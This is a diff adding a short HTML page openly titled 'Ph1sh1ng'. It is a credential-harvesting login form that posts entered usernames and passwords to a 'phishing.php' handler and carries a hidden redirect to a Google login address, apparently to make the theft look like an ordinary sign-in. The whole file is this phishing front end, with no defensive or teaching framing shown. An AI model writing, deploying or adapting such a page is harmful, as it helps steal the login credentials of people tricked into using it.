@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ph1sh1ng</title>
+    <link rel="stylesheet" href="css/default.css">
+</head>
+<body>
+    <form action="phishing.php" method="POST">
+        <input type="text" name="username" placeholder="Enter username" required>
+        <input type="password" name="password" placeholder="Enter password" required>
+        <input type="hidden" name="redirect" value="https://google.com/login">
+        <input type="submit" name="submit" value="submit">
+    </form>
+</body>
+</html>
